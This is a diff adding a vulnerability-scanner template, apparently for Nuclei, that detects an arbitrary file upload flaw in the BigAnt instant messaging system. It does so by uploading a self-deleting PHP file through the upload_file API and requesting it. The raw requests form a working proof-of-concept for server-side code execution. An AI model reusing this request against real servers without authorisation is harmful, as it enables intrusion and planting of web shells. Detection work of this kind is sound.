@@ -1,0 +1,35 @@
+id: DaMaYi-BigAnt-JiShiTongXunXiTong-upload_file-File-Upload
+
+info:
+  name: 大蚂蚁 (BigAnt) 即时通讯系统 upload_file 任意文件上传
+  author: HuanXiong
+  severity: critical
+
+http:
+  - raw:
+      - |
+        POST /?m=Api&c=DispersedAddin&a=upload_file HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+        
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="file_info"
+        
+        [{"file_path":"test.php"}]
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="file"; filename="1.txt"
+        
+        <?=md5(123456);unlink(__FILE__);
+        ------WebKitFormBoundary--
+
+      - |
+        GET /test.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        name: 文件上传
+        dsl:
+          - "status_code==200 && contains_all(body,'e10adc3949ba59abbe56e057f20f883e')"
